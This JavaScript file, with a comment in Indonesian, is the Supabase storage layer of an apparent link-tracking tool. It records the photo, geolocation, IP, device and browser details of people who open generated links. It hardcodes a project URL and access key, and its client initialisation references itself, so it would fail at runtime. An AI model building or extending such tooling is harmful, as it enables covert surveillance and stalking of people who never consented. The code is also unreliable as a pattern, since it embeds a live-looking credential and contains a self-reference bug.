// Supabase Configuration - GANTI DENGAN CONFIG ANDA
const SUPABASE_URL = 'https://woeojsjkwzwewaxcdtrq.supabase.co';
const SUPABASE_ANON_KEY = '.eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6IndvZW9qc2prd3p3ZXdheGNkdHJxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTk3NjkzODMsImV4cCI6MjA3NTM0NTM4M30.p7Pyus1p3Aixp5WOlyqNRaOL5jC4N9PA4T7OrMQAKDQ';

// Initialize Supabase client
const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

// Database Functions
class TrackingDB {
    // Create new tracking link
    static async createLink(linkData) {
        try {
            const { data, error } = await supabase
                .from('tracking_links')
                .insert([{
                    id: linkData.id,
                    name: linkData.name,
                    destination: linkData.destination,
                    description: linkData.description,
                    tracking_url: linkData.tracking_url
                }])
                .select();
            
            if (error) throw error;
            return { success: true, data: data[0] };
        } catch (error) {
            console.error('Error creating link:', error);
            return { success: false, error: error.message };
        }
    }

    // Get all tracking links
    static async getLinks() {
        try {
            const { data, error } = await supabase
                .from('tracking_links')
                .select('*')
                .order('created_at', { ascending: false });
            
            if (error) throw error;
            return { success: true, data };
        } catch (error) {
            console.error('Error getting links:', error);
            return { success: false, error: error.message };
        }
    }

    // Delete tracking link
    static async deleteLink(linkId) {
        try {
            const { error } = await supabase
                .from('tracking_links')
                .delete()
                .eq('id', linkId);
            
            if (error) throw error;
            return { success: true };
        } catch (error) {
            console.error('Error deleting link:', error);
            return { success: false, error: error.message };
        }
    }

    // Save tracking result
    static async saveResult(resultData) {
        try {
            const { data, error } = await supabase
                .from('tracking_results')
                .insert([{
                    track_id: resultData.trackId,
                    link_name: resultData.linkName,
                    timestamp: resultData.timestamp,
                    location: resultData.location,
                    photo: resultData.photo,
                    ip: resultData.ip,
                    device: resultData.device,
                    browser: resultData.browser,
                    user_agent: resultData.userAgent,
                    screen: resultData.screen,
                    language: resultData.language,
                    timezone: resultData.timezone
                }])
                .select();
            
            if (error) throw error;
            return { success: true, data: data[0] };
        } catch (error) {
            console.error('Error saving result:', error);
            return { success: false, error: error.message };
        }
    }

    // Get all tracking results
    static async getResults() {
        try {
            const { data, error } = await supabase
                .from('tracking_results')
                .select(`
                    *,
                    tracking_links (
                        name,
                        destination
                    )
                `)
                .order('created_at', { ascending: false });
            
            if (error) throw error;
            return { success: true, data };
        } catch (error) {
            console.error('Error getting results:', error);
            return { success: false, error: error.message };
        }
    }

    // Get link by ID
    static async getLinkById(linkId) {
        try {
            const { data, error } = await supabase
                .from('tracking_links')
                .select('*')
                .eq('id', linkId)
                .single();
            
            if (error) throw error;
            return { success: true, data };
        } catch (error) {
            console.error('Error getting link:', error);
            return { success: false, error: error.message };
        }
    }

    // Get statistics
    static async getStats() {
        try {
            const { data: linksData, error: linksError } = await supabase
                .from('tracking_links')
                .select('id');
            
            if (linksError) throw linksError;

            const { data: resultsData, error: resultsError } = await supabase
                .from('tracking_results')
                .select('created_at, location');
            
            if (resultsError) throw resultsError;

            const totalLinks = linksData.length;
            const totalResults = resultsData.length;
            
            // Count today's results
            const today = new Date().toISOString().split('T')[0];
            const todayResults = resultsData.filter(result => 
                result.created_at.startsWith(today)
            ).length;
            
            // Count results with location
            const withLocation = resultsData.filter(result => 
                result.location
            ).length;
            
            return {
                success: true,
                data: {
                    totalLinks,
                    totalResults,
                    todayResults,
                    withLocation
                }
            };
        } catch (error) {
            console.error('Error getting stats:', error);
            return { success: false, error: error.message };
        }
    }
}
